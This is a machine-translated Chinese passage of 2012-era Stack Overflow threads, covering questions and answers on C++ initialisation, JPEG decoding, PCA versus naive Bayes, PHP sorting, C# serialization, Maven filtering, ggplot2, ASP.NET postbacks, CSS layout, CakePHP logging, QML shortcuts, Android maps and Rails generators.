但这不应该有所作为（除了可读性）。

问题是以下两件事之一：

*   过时的构建
*   运行优化并检查调试器中的值（这是我的猜测）。它可能会告诉您这`renderer`不是 NULL，但您不应该信任发布版本中的调试器。

我敢肯定，如果您输出一些调试语句，您会看到该值实际上设置正确：

```
monster::monster() : mob(), renderer(NULL) {
   if (renderer)
       std::cout << "WTH!";
   else
       std::cout << "correctly set to NULL";
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T09:07:06.573

我发现了问题。。

我`mob`在两个不同的文件中定义了这个类。我不知道我怎么忽略了这一点。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-30T08:36:25.567

`0xcdcdcdcd`通常表示内存未初始化。如果`renderer`在基类中也可能发生这种情况。尝试在课堂上重命名`renderer`为，看看是否遇到同样的问题。`m_renderer``monster`

# jpeg - 与基线 jpeg 相比，显示渐进式 jpeg 的速度要慢多少？

> ID：12192748
> 
> 赞同：0
> 
> 时间：2012-08-30T08:23:13.147
> 
> 标签：jpeg, progressive

我对在本地存储文件时显示文件所需的计算时间感兴趣。我对手机等移动设备特别感兴趣。这个想法是通过“jpegtran -optimize”或“jpegtran -optimize -progressive”运行所有图片来节省一些磁盘空间。也许有人有基准？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T21:26:39.983

时间差实际上取决于JPEG解码器的作者。如果程序在显示图像之前完全解码图像，则解码时间应该没有太大差异。一些解码器会在每次扫描解码后显示图像，这显然需要更长的时间。渐进式 JPEG 具有与普通 JPEG 基本相同数量的熵编码数据。每次扫描的图像层上越来越多的细节进入到每个 MCU 块中。DCT和颜色转换步骤花费的时间最多，因此如果图像仅在完成解码后显示，总时间应该相似。

# machine-learning - PCA、LDA 和朴素贝叶斯

> ID：12192750
> 
> 赞同：6
> 
> 时间：2012-08-30T08:23:29.653
> 
> 标签：machine-learning

我正在尝试将线性判别分析应用于二分类问题。据我了解，LDA 假设两个类具有相同的协方差矩阵，然后将似然性建模为具有不同均值的高斯分布。

我尝试过的另一个分类器是朴素贝叶斯。它忽略了预测变量之间的任何相关性。

现在，我不明白将 PCA 应用于数据集时会发生什么。根据其定义，PCA 算法旋转数据使得协方差矩阵是对角线。旋转没有丢失任何东西，但是由于协方差矩阵现在是对角的，朴素贝叶斯不应该和 LDA 一样好，甚至更好，因为 LDA 将有更多的参数来估计？然而，根据我的数据，无论有没有 PCA，LDA 的表现都优于朴素贝叶斯。

确实，只要我使用了所有的主成分，数据是完全一样的，这告诉我结果确实应该是这样的。然而协方差矩阵是对角线的......*大脑崩溃*

有人可以向我解释一下吗？我希望我已经足够清楚地表达了我的问题。谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-30T13:12:04.043

PCA 对于降维很有用（例如，如果你的训练集的大小对于数据的维数来说太小了）。但是，如果您使用所有主成分，PCA 不会改善线性分类器的结果 - 如果您的类在原始数据空间中不是线性可分的，那么通过 PCA 旋转坐标不会改变这一点。

关于 PCA 需要注意的另一点是，它是根据*整个*样本集的统计数据计算坐标旋转，而不考虑类标签。即使您的类可能是完全线性可分的（在 PCA 之前和之后），但这并不意味着它们可以通过每个转换后的坐标独立分离（即，线性决策边界不平行于任何转换后的坐标）坐标轴）。在这种情况下，我预计朴素贝叶斯会产生较低的准确性，因为根据定义，它独立处理每个轴。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:30:35.340

据我所知，PCA 本身并没有消除变量之间的依赖关系，只是找到了数据的重新参数化。如果您随后丢弃了除少数顶部方差维度之外的所有维度（称为降维），这可能会有所帮助。然而，我认为，在只有两个类和许多相互依赖的特征的环境中，使用判别分类器可能比 PCA+bayes 效果更好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T06:55:21.990

@bogatron 只是指出朴素贝叶斯不需要问题在其中一个维度上是线性可分的。在 3-d 空间中的二分类问题中，决策边界在

```
p(x|1)p(y|1)p(z|1) = p(x|2)p(y|2)p(z|2) 
```

如果我们先假设一个统一的假设

```
P(M1)=P(M2)=0.5\. 
```

根据 的具体形式`p(.|1) and p(.|2)`，边界可能是复杂和非线性的，并且不平行于任何轴。

# php - 按数组排列的显示对象

> ID：12192755
> 
> 赞同：0
> 
> 时间：2012-08-30T08:23:58.250
> 
> 标签：php, arrays, codeigniter, sorting

我有一个对象 student ，它具有诸如 student->name 、 student->age 、 student->marks 、 student->id 等变量

我试过这个：我这样做是为了得到排序的 id 数组

```
foreach($student as $s){
array_push($student_id_array,$s->id) }
sort($student_id_array); 
```

所以我有学生的排序 id 数组，但是我怎样才能以与 $student_id_array 相同的顺序显示 100 个 $student 实例？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:26:17.267

`$students`这将根据每个对所有数组进行排序`$student->id`：

```
$stud = array (
                (object)array('name' => 'John Doe', 'id' => 1),
                (object)array('name' => 'Jane Doe', 'id' => 3),
                (object)array('name' => 'Luke Will', 'id' => 4),
                (object)array('name' => 'Eric Sting', 'id' => 2)
            );
$Students = array();
foreach($stud as $s){
     $Students[$s->id] = $s;
}
ksort($Students);

foreach($Students as $s){
     echo $s->name; 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:29:25.903

您可以按顺序显示数组（创建数组的顺序），方法是像这样循环遍历它：

```
foreach($student_id_array as $student) {
    echo 'student #' . $student->id . ', name: ' . $student->name . '<br/>';
} 
```

# java - Java：从非常大的文本文件中读取具有相同前缀的行组

> ID：12192757
> 
> 赞同：0
> 
> 时间：2012-08-30T08:24:05.073
> 
> 标签：java, file, text, line, bufferedreader

我有一个大的（~100GB）文本文件，结构如下：

```
A,foobar
A,barfoo
A,foobar
B,barfoo
B,barfoo
C,foobar 
```

每行都是逗号分隔的一对值。该文件按该对中的第一个值排序。这些行是可变长度的。将组定义为具有共同第一个值的所有行，即上面引用的示例中，所有以“A”开头的行都是一个组，所有以“B”开头的行都是另一个组。

整个文件太大而无法放入内存，但是如果您从任何单独的组中取出所有行，则始终可以放入内存。

我有一个例程来处理一组这样的行并写入文本文件。我的问题是我不知道如何最好地一次读取一组文件。所有组都是任意的、未知的大小。我考虑了两种方法：

1) 使用 a 扫描文件`BufferedReader`，将组中的行累积到字符串或数组中。每当遇到属于新组的行时，将该行保存在临时变量中，处理前一个组。清除累加器，添加临时，然后从第二行开始继续读取新组。

2）使用 a 扫描文件`BufferedReader`，每当遇到属于新组的行时，以某种方式重置光标，以便`readLine()`下次调用时它从组的第一行而不是第二行开始。我已经调查过了`mark()`，`reset()`但是这些需要知道行首的字节位置。

我现在将使用（1），但如果有人能提出一种气味较少的方法，我将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:29:50.157

我认为[PushbackReader](http://docs.oracle.com/javase/1.4.2/docs/api/java/io/PushbackReader.html)会起作用：

```
 if (lineBelongsToNewGroup){
     reader.unread(lastLine.toCharArray());
     // probably also unread a newline
 } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:30:40.593

我认为选项1是最简单的。我会自己解析文本，而不是使用 BufferedReader，因为解析 100 GB 需要很长时间。

唯一可能更快的选择是使用 RandomAccessFile 使用二进制搜索访问文件。您可以在 64 位 JVM 上映射 100 GB 内存。这避免了解析非常昂贵的每一行的需要。这种方法的一个优点是您可以使用多个线程。它的实现要复杂得多，但应该快得多。一旦有了每个边界，您就可以批量复制原始数据，而无需解析所有行。

# c# - 将两个列表保存到文件中，然后加载 c#

> ID：12192758
> 
> 赞同：0
> 
> 时间：2012-08-30T08:24:13.973
> 
> 标签：c#

在我的班级“DiaryManager”中，我得到了两个具有两种不同类型（T）的列表，我想将它保存到文件中，然后我想加载它。正如我将向您展示的那样，我让它与我的列表之一一起使用。

我在工作代码中保存和加载的列表名为“m_diary”。保存方法是这样的：

```
 /// <summary>
    /// Saves the object information
    /// </summary>
    public void Save()
    {
        // Gain code access to the file that we are going
        // to write to
        try
        {
            // Create a FileStream that will write data to file.
            FileStream writerFileStream =
                new FileStream(DATA_FILENAME, FileMode.Create, FileAccess.Write);
            // Save our dictionary of friends to file
            m_formatter.Serialize(writerFileStream, m_diary);

            // Close the writerFileStream when we are done.
            writerFileStream.Close();
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        } 
    } 
```

我的加载方法是这样的：

```
 /// <summary>
    /// Load the object to the program 
    /// </summary>
    public void Load()
    {

        // Check if we had previously Save information of our friends
        // previously
        if (File.Exists(DATA_FILENAME))
        {

            try
            {
                // Create a FileStream will gain read access to the
                // data file.
                FileStream readerFileStream = new FileStream(DATA_FILENAME,
                    FileMode.Open, FileAccess.Read);
                // Reconstruct information of our friends from file.
                m_diary = (List<Diary>)                    
                    m_formatter.Deserialize(readerFileStream);
                // Close the readerFileStream when we are done
                readerFileStream.Close();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            } 

        } 

    } 
```

“DATA_FILENAME”是这个常量：

```
 private const string DATA_FILENAME = "TrainingDiary.dat"; 
```

此代码在我的 Windows 窗体类中完美运行。但现在 Iv 添加了一个不同类型的列表。

如何保存第二个列表并将其加载到？:)

最好的问候 Cyrix

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:30:37.587

您可以对第二个列表使用类似的代码，也可以编写一个[通用方法](http://msdn.microsoft.com/en-us/library/twcad0zb%28v=vs.80%29.aspx)：

```
 public static void Save<T>(string fileName, List<T> list)
    {
        // Gain code access to the file that we are going
        // to write to
        try
        {
            // Create a FileStream that will write data to file.
            using (var stream = new FileStream(fileName, FileMode.Create, FileAccess.Write))
            {
                var formatter = new BinaryFormatter();
                 formatter.Serialize(stream, list);
            }

        }
        catch (Exception ex)
        {
           Console.WriteLine(ex.Message);
        }
    } 
```

还有一个加载方法：

```
 public static List<T> Load<T>(string fileName)
    {
        var list = new List<T>();
        // Check if we had previously Save information of our friends
        // previously
        if (File.Exists(fileName))
        {

            try
            {
                // Create a FileStream will gain read access to the
                // data file.
                using (var stream = new FileStream(fileName, FileMode.Open, FileAccess.Read))
                {
                    var formatter = new BinaryFormatter();
                    list = (List<T>)
                        formatter.Deserialize(stream);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }
        return list;
    } 
```

负载的使用：

```
 var list = new List<string> {"one", "two", "three"};
        Save("first.dat", list);

        var list2 = Load<string>("first.dat");
        foreach (var VARIABLE in list2)
        {
            Console.WriteLine(VARIABLE);
        } 
```

另请参阅[使用语句](http://msdn.microsoft.com/en-us/library/yh598w02%28v=vs.80%29.aspx)处理[打开/关闭流](http://www.blackwasp.co.uk/UsingStatement.aspx)；

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:28:03.157

您应该创建一个包含要保存的所有数据（列表）的类。然后将该类保存到文件中。

# unit-testing - 如何使用maven资源插件中的maven过滤功能

> ID：12192761
> 
> 赞同：0
> 
> 时间：2012-08-30T08:24:17.220
> 
> 标签：unit-testing, maven, filtering, maven-resources-plugin

我有一个在 Maven 的帮助下开发的 java 项目。该项目的一部分是单元测试。我计划将单元测试生成的所有临时文件放入 maven 的目标目录中。这可能是一个好主意，因为如果由于某种原因临时文件没有被单元测试删除，则可能会清理目标目录，并且所有临时文件仍然存在于文件系统中。所以我找到了 maven 资源插件的[过滤](http://maven.apache.org/plugins/maven-resources-plugin/examples/filter.html)功能，想知道是否可以为我的用例实例化它。我的计划是在属性文件中有一个像这样的条目

```
targetdir = ${project.build.directory} 
```

它应该为我提供一个显示 Maven 目标目录位置的属性。现在，需要注意的是，过滤后的属性文件由 maven 资源插件存储在目标目录中。
我怎么能在那里找到它？我需要属性文件来告诉我目标目录在哪里，但属性文件在目标目录中？我的方法还值得做吗？或者这种方式不可能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:53:36.337

我有两种方法：

**1\. 使用Java Magic**
在这里，我只是跑了一个技巧

```
@Test
public void testpath(){
    //gets me surefire report dir, lies just below /target
    File testDir = new File(TestTargetPath.class.getResource("/").getPath());
    //Get its parent! location of target
    System.out.println("target? " + testDir.getParent());

    //modify your properties object to set this as targetDir
} 
```

这打印

```
 target? /home/naishe/workspace/in/naishe/homeapp/target 
```

* * *

**2\. 使用相对路径读取配置文件作为资源**

在 Maven 布局中有两个地方可以放置资源文件，例如配置属性。

1.  `/src/main/resources`-- 此文件下的文件作为工件的一部分。您可以使用`getResource()`以下任何类访问它们`/src/main/java`

2.  `/src/test/resources`- 此下的文件*不*作为工件的一部分，但它们可从任何类中获得`/src/test/java`。

因此，根据您的需要，您可以将您`config.properties`的位置保留在一个或两个位置下，并使用以下命令读取配置文件：

```
 Properties props = new Properties();
    InputStream stream = AppConfig.class.getResourceAsStream("/config.properties");
    props.load(stream);
    System.out.println(">> " + props.getProperty("targetDir")); 
```

# r - 不同 facet_grids 的不同颜色

> ID：12192764
> 
> 赞同：5
> 
> 时间：2012-08-30T08:24:39.057
> 
> 标签：r, colors, ggplot2

我很难为我的 2 个不同的 facet_grids 获得不同的颜色。

这是我的简单示例：

```
df <- data.frame(x = rep(1:20, each=20), y= rep(1:20, 20),
             val = sample(0:1,400, replace=TRUE),
             facet_grid = c(rep("A", 200), rep("B", 200)))
colors <- c(1,2)
ggplot(df, aes(x = x, y = y)) +
    geom_tile(aes(fill = val)) +
    facet_grid(. ~ facet_grid, scales = "free") +
    scale_fill_gradient(limits=c(0,1), low=brewer.pal(11, "RdYlGn")[colors][1],  
                        high="grey30") 
```

我正在使用该`scale_fill_gradient`函数和该`brewer.pal`函数来覆盖所使用的标准颜色。但是，我想要实现的是在两个不同的 facet_grids 中设置为 1 的值，应该使用相同的颜色（grey30）。例如，对于第一个 facet_grig 中为 0 的值，应使用红色，而在第二个 facet_grid 中应使用绿色。

任何人都可以给我一个关于如何实现这一目标的提示吗？

我创建了另一个示例，该示例现在更接近我想要的但我不明白为什么`scale_fill_identity`不起作用。为此，我稍微更改了数据框，以便该值现在有 4 个不同的值：

```
df <- data.frame(x = rep(1:20, each=20), y= rep(1:20, 20),
             val = c(sample(0:1,200, replace=TRUE), sample(2:3,200, replace=TRUE)),
         facet_grid = c(rep("A", 200), rep("B", 200)))

ggplot(df, aes(x = x, y = y)) +
    geom_tile(aes(fill = val)) +
    facet_grid(. ~ facet_grid, scales = "free")

ggplot(df, aes(x = x, y = y)) +
    geom_tile(aes(fill = val)) +
    facet_grid(. ~ facet_grid, scales = "free")

scale_fill_identity(labels=letters[1:4], breaks=c("red","blue","green","brown")) + 
```

第一个 ggplot 给了我几乎我想要的东西。两个不同的 facet_grids 中有 4 种不同的颜色。我试图用来`scale_fill_identity`改变 4 种颜色，但我在情节中得到的是 4 种不同的颜色，黑色/白色和红色/绿色，而不是上面指定的颜色。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-30T09:38:24.390

尝试这个

```
ggplot(df, aes(x = x, y = y),colour=val) +
  geom_tile(aes(fill = factor(val))) +
  facet_grid(. ~ facet_grid, scales = "free")+
  scale_fill_manual(labels=letters[1:4], values=c("red","blue","green","brown")) 
```

# c# - 为什么我的提交按钮提交两次？

> ID：12192765
> 
> 赞同：2
> 
> 时间：2012-08-30T08:24:44.463
> 
> 标签：c#, asp.net, html, double-submit-problem

网页

```
<body>
  <form id="form1" action="Default.aspx" method="post">
    <input runat="server" id="txtuser" type="text" />
    <input runat="server" id="txtpwd" type="password" />
    <input type="submit" value="Login"/>
 </form>
</body> 
```

代码隐藏

```
protected void Page_Load(object sender, EventArgs e)
{
   if (!Page.IsPostBack)
   {
        Login();
   }
}

private void Login()
{
   if (checkUser(Request.Params["txtuser"],Request.Params["txtpwd"]))
   {
        Response.Redirect("Success.aspx");//if success
   }
} 
```

我正在为遇到问题的旧移动版本（如诺基亚 N70）开发网页。当我提交我的用户名和密码时，请检查用户返回 true 以重定向到新页面。但它不会重定向到`success.aspx`. 所以我在`Response.Redirect`代码上调试点，它可以停在那里，我继续运行成为错误，因为让用户名和密码为空。然后我意识到它加载了两次页面。如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T08:28:24.547

您想在有 PostBack 时登录。不是反过来。

改变

```
if (!Page.IsPostBack) 
```

至

```
if (Page.IsPostBack) 
```

确保您已`AutoEventWireup`在 Code Front 中设置为 true：

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Default.aspx.cs"... 
```

否则永远不会触发 Page_Load。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T08:38:11.807

您应该以正确的方式使用表单身份验证，就像[这里解释的那样](http://msdn.microsoft.com/en-us/library/ff647070.aspx)

你应该为你的重定向做这样的事情：

```
if (checkUser(userName.Text, password.Text))
{
    FormsAuthentication.RedirectFromLoginPage(userName.Text, false);
} 
```

# html - 使跨度填充高度 - 即使在滚动时

> ID：12192775
> 
> 赞同：1
> 
> 时间：2012-08-30T08:25:09.893
> 
> 标签：html, css

我有两个围绕我的内容的跨度 div。我想让他们填满高度。`height: 100%;`当不需要滚动时工作正常，但是一旦页面足够长以至于用户需要滚动，跨度只存在于第一个高度，然后不填充整个高度。有任何想法吗？jsfiddle： http: [//jsfiddle.net/2fvcF/4/](http://jsfiddle.net/2fvcF/4/) 出于某种原因，它甚至没有显示跨度。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:30:50.787

浮动元素脱离了主流。你必须使用这样的[**东西**](http://www.ejeliot.com/blog/61)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:37:59.967

您可以`$(document).height()`在 jQuery 中使用以使其工作在 100% 高度。例如

```
$(document).ready(function() {

   $('#left').height($(document).height());
   $('#right').height($(document).height());

}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:35:32.467

```
function set_properties () {
    $('#left').css('height', function() {
        return $('#contentArea').innerHeight() + "px";
    });
    $('#right').css('height', function() {
        return $('#contentArea').innerHeight() + "px";
    });
}
$(document).ready(function() {
    $(window).scroll(set_properties); 
    $(window).resize(set_properties);
    set_properties();   
}); 
```

或更改一点 CSS 无需使用 javascript/jQuery 将 DIV 显示为表格/单元格。

```
#contentArea {
    width: 800px;
    display: table;
    color: #CCC;
    margin-top: 0px;
    background-color: #000;
    margin-right: auto;
    margin-bottom: 0px;
    margin-left: auto;
    border-right-width: 1px;
    border-left-width: 1px;
    border-right-style: solid;
    border-left-style: solid;
    border-right-color: #999;
    border-left-color: #999;
    height: 100%;
    border-top-style: none;
    border-bottom-style: none;
}

#contentArea #tc1,
#contentArea #tc3 {
    display: table-cell;
    width: 100px;
    background-color: #F00;
}

<div id="contentArea">
  <div id="tc1">&nbsp;</div>
  <div id="tc2">
    <div class="header"> ... </div>
    <div class="ui-widget" style="margin: 0px;"> ... </div>
    <div class="main"> ... </div>
  </div>
  <div id="tc3">&nbsp;</div>
</div> 
```

# cakephp - 在 CakePHP 系统中记录 PHP 致命错误

> ID：12192779
> 
> 赞同：0
> 
> 时间：2012-08-30T08:25:47.750
> 
> 标签：cakephp, logging, cakephp-2.0, php

我需要记录我网站的致命错误。

我通常会检查 error.log 和 debug.log 文件中的 CakePHP 错误。
但我发现 PHP 相关的致命错误没有记录在某个地方。[此线程](https://groups.google.com/forum/?fromgroups=#!topic/cake-php/bPpmO-Vs_rY)
中也对此进行了讨论。

我检查了 php.ini。它有以下几行：

```
log_errors = On
;error_log = filename 
```

我无权更改 php.ini。我可以要求管理员更改此设置，但似乎每次我需要更改时我都需要问他:) 我也担心性能。日志记录错误是否会降低性能？

所以我发现我可以在我的脚本中放入以下两行来记录错误并在需要时更改文件夹或文件名。

```
ini_set("log_errors", 1);
ini_set("error_log", "/path/to/php-error.log"); 
```

所以我想知道在我的代码中将这些行放在哪里？我应该把它放在 AppController::beforeFilter 里面吗？还是在 CakePHP 2 配置中有更好的地方/解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T10:02:59.847

这是一种旧思路。与此同时，cake 2.x 错误都以生产模式记录 - 致命错误也是如此。

触发一个并检查您的`/tmp/logs/error.log`

但是您可以通过查看核心代码轻松找到： [https ://github.com/cakephp/cakephp/blob/master/lib/Cake/Error/ErrorHandler.php#L189](https://github.com/cakephp/cakephp/blob/master/lib/Cake/Error/ErrorHandler.php#L189)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T04:35:08.710

有框架定义的配置设置。您可以使用[错误处理配置](http://book.cakephp.org/2.0/en/development/errors.html#error-configuration)类。

这是[更改致命错误行为](http://book.cakephp.org/2.0/en/development/errors.html#changing-fatal-error-behavior)链接，这将帮助您实现相同的目标。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T09:12:48.450

`register_shutdown_function();`

[http://php.net/manual/en/function.register-shutdown-function.php](http://php.net/manual/en/function.register-shutdown-function.php)

# qt - 将键盘快捷键分配给 QML 组件

> ID：12192780
> 
> 赞同：15
> 
> 时间：2012-08-30T08:25:56.110
> 
> 标签：qt, qml, qt-quick, qt4.7, qt5.1

我正在深入使用 QML 和 Qt Creator 构建桌面应用程序，我目前正在研究键盘处理以及它如何与 QML 元素一起使用。我已经意识到桌面小部件缺乏适当的 QML 替代品。

我当前的问题是我希望为某些特定的 QML 组件分配一些全局键盘快捷键（例如为 GUI 上的按钮分配键盘快捷键），这些组件应该可以激活它们。我能做到的最好的办法是使用 FocusScopes 和 Key Navigation 来通过键盘导航 GUI，但这不是一回事。

谁能建议在这种情况下该怎么做？Qt 5 有没有这样的功能？我在互联网上找不到任何关于此的信息。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-11-26T13:11:33.627

回答我自己的问题，因为快捷方式现在可以在 Qt 5.1.1 中实现。快捷方式可以很容易地绑定到`QtQuick`控件，如`Button`，`ToolButtons`并`MenuItem`使用 QML`Action`项。例如：

```
ApplicationWindow {
    ...
    ToolButton { action: openAction } // Add a tool button in a ToolBar
    ...
    Action {
        id: openAction
        text: "&Open"
        shortcut: "Ctrl+O"
        onTriggered: // Do some action
        tooltip: "Open an image"
    }
} 
```

按 Ctrl+O 将执行 onTriggered 部分中指定的操作。

参考[Qt Quick Controls Gallery 例子](http://qt-project.org/doc/qt-5.1/qtquickcontrols/gallery.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-03-23T02:10:28.607

您可以通过在 C++(Qt) 中使用 EventFilter 来完全使用 QML 中的快捷方式。

您可以通过以下步骤进行：

```
1\. Create a Shortcut class by C++.
2\. Register QML Type for Shortcut class
3\. Import Shortcut to QML file and handle it. 
```

```
#ifndef SHORTCUT_H
#define SHORTCUT_H

#include <QDeclarativeItem>

class Shortcut : public QObject
{
    Q_OBJECT
    Q_PROPERTY(QVariant key READ key WRITE setKey NOTIFY keyChanged)
public:
    explicit Shortcut(QObject *parent = 0);

    void setKey(QVariant key);
    QVariant key() { return m_keySequence; }

    bool eventFilter(QObject *obj, QEvent *e);

signals:
    void keyChanged();
    void activated();
    void pressedAndHold();

public slots:

private:
    QKeySequence m_keySequence;
    bool m_keypressAlreadySend;
};

#endif // SHORTCUT_H
```

```
#include "shortcut.h"
#include <QKeyEvent>
#include <QCoreApplication>
#include <QDebug>
#include <QLineEdit>
#include <QGraphicsScene>

Shortcut::Shortcut(QObject *parent)
    : QObject(parent)
    , m_keySequence()
    , m_keypressAlreadySend(false)
{
    qApp->installEventFilter(this);
}

void Shortcut::setKey(QVariant key)
{
    QKeySequence newKey = key.value<QKeySequence>();
    if(m_keySequence != newKey) {
        m_keySequence = key.value<QKeySequence>();
        emit keyChanged();
    }
}

bool Shortcut::eventFilter(QObject *obj, QEvent *e)
{
    if(e->type() == QEvent::KeyPress && !m_keySequence.isEmpty()) {
//If you want some Key event was not filtered, add conditions to here
        if ((dynamic_cast<QGraphicsScene*>(obj)) || (obj->objectName() == "blockShortcut") || (dynamic_cast<QLineEdit*>(obj)) ){
            return QObject::eventFilter(obj, e);
        }
        QKeyEvent *keyEvent = static_cast<QKeyEvent*>(e);

        // Just mod keys is not enough for a shortcut, block them just by returning.
        if (keyEvent->key() >= Qt::Key_Shift && keyEvent->key() <= Qt::Key_Alt) {
            return QObject::eventFilter(obj, e);
        }

        int keyInt = keyEvent->modifiers() + keyEvent->key();

        if(!m_keypressAlreadySend && QKeySequence(keyInt) == m_keySequence) {
            m_keypressAlreadySend = true;
            emit activated();
        }
    }
    else if(e->type() == QEvent::KeyRelease) {
        m_keypressAlreadySend = false;
    }
    return QObject::eventFilter(obj, e);
}
```

```
qmlRegisterType<Shortcut>("Project", 0, 1, "Shortcut");
```

```
import Project 0.1

Rectangle {
.................
.................
Shortcut {
        key: "Ctrl+C"
        onActivated: {
            container.clicked()
            console.log("JS: " + key + " pressed.")
        }
    }

}
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-02-20T16:02:19.193

从 Qt 5.9 开始，甚至[包括](https://doc.qt.io/qt-5/qml-qtquick-shortcut.html)所需的行为：

```
import QtQuick 2.9

Item {
    Shortcut {
       context: Qt.ApplicationShortcut
       sequences: [StandardKey.Close, "Ctrl+W"]

        onActivated: {
            container.clicked()
            console.log("JS: Shortcut activated.")
        }
    }
} 
```

如果省略上下文，它将仅适用于当前活动的窗口，否则对于整个应用程序，请参阅[文档](https://doc.qt.io/qt-5/qml-qtquick-shortcut.html)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-11T09:53:20.587

因此，假设您正在像这样在该按钮单击事件上调用一个函数，

```
Button {
  ...
  MouseArea {
    anchor.fill: parent
    onClicked: callThisFunction();
  }
} 
```

然后您可以通过这种方式分配分配全局键盘快捷键。但限制是全局 QML 元素（包含所有其他 QML 元素的父元素）应该具有焦点。前任。：

```
Rectangle {
  id: parentWindow
  ...
  ...
  Button {
    ...
    MouseArea {
      anchor.fill: parent
      onClicked: callThisFunction();
    }
  }
  Keys.onSelectPressed: callThisFunction()
} 
```

这不完全是您想要的，但它可能会有所帮助。

# android - Android：Google MapView 在地图加载时显示进度指示器

> ID：12192782
> 
> 赞同：8
> 
> 时间：2012-08-30T08:25:58.213
> 
> 标签：android, google-maps

[`MapView`](https://developers.google.com/maps/documentation/android/reference/com/google/android/maps/MapView)如果 a仍在加载，有没有办法听？`MapView`因为我想在下载地图图块时显示进度指示器（例如沙漏） 。

有什么解决办法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-10-20T10:33:36.707

您可以使用`OnCameraChangeListener`and`OnMapLoadedCallback`来模拟这种行为。

从以下[文档](https://developers.google.com/android/reference/com/google/android/gms/maps/GoogleMap.OnCameraChangeListener.html)：`GoogleMap.OnCameraChangeListener`

> **公共抽象无效 onCameraChange（CameraPosition 位置）**
> 
> 在相机位置改变后调用。在动画期间，可能不会通知此侦听器中间摄像机位置。动画中的最终位置始终调用它。
> 
> 这在主线程上调用。

从以下[文档](https://developers.google.com/android/reference/com/google/android/gms/maps/GoogleMap.OnMapLoadedCallback)：`GoogleMap.OnMapLoadedCallback`

> **公共抽象无效 onMapLoaded ()**
> 
> 在地图完成渲染时调用。这只会被调用一次。如果您想再次收到通知，您必须请求再次回拨。

如那里所述，`onMapLoaded()`只会被调用一次，因此策略可能是`GoogleMap.OnMapLoadedCallback`每次`onCameraChange`调用时都请求一个。

这是一个（非常简单的）示例来说明答案：

```
public class MapsActivity extends FragmentActivity implements OnCameraChangeListener, OnMapLoadedCallback {
    private GoogleMap googleMap;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_maps);

        SupportMapFragment mapFragment=(SupportMapFragment)getSupportFragmentManager().findFragmentById(R.id.map);
        googleMap = mapFragment.getMap();

        googleMap.setOnCameraChangeListener(this);
    }

    @Override
    public void onMapLoaded() {
        //TODO: Hide your progress indicator
    }

    @Override
    public void onCameraChange(final CameraPosition cameraPosition) {
        googleMap.setOnMapLoadedCallback(this);

        //TODO: Show your progress indicator
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T15:16:49.027

MapView的[onDraw文档说](https://developers.google.com/maps/documentation/android/reference/com/google/android/maps/MapView#onDraw%28android.graphics.Canvas%29)

> “我们绘制地图背景（适当加载图块）”

您可以尝试扩展 MapView 并在 onDraw 完成时隐藏进度指示器。但我的猜测是 MapTiles 是异步加载的，因此您的进度条会在 MapTiles 全部加载之前完成。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T15:09:59.763

在当前`MapView`实现中没有直接的 API 来执行此操作。

# ruby-on-rails - 找不到生成器 - 我的引擎的自定义生成器

> ID：12192784
> 
> 赞同：1
> 
> 时间：2012-08-30T08:26:13.007
> 
> 标签：ruby-on-rails, generator, rails-engines

我为我的引擎编写了一些自定义生成器来简化我的工作。我想在我的引擎中直接生成一些文件。然而，生成器只能从虚拟应用程序访问，而不是直接从引擎访问。

```
my_engine_root:# rails g custom_generator  
Could not find generator custom_generator.

engine_dummy_path:# rails g custom_generator  
Everything works... 
```

我试图要求生成器路径，但没有任何效果。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-18T20:31:18.060

First of all, isolate your custom generator to a separated engine, so you can add this excerpt to "script/rails" or "bin/rails", depending on rails version, in the engine which you want the generators available:

```
ENV['BUNDLE_GEMFILE'] ||= File.expand_path('../../Gemfile', __FILE__)
require 'bundler/setup' if File.exists?(ENV['BUNDLE_GEMFILE']) 
```

then add rails, your custom generator gem and all dependencies to the Gemfile of your engine

```
gem 'rails', '~> 4.0.2'
gem 'my_custom_generator', :path => "/path/to/my_custom_generator" 
```

# java - 协议违规：块大小中出现意外的单个换行符

> ID：12192790
> 
> 赞同：0
> 
> 时间：2012-08-30T08:26:27.927
> 
> 标签：java, jersey, httpclient

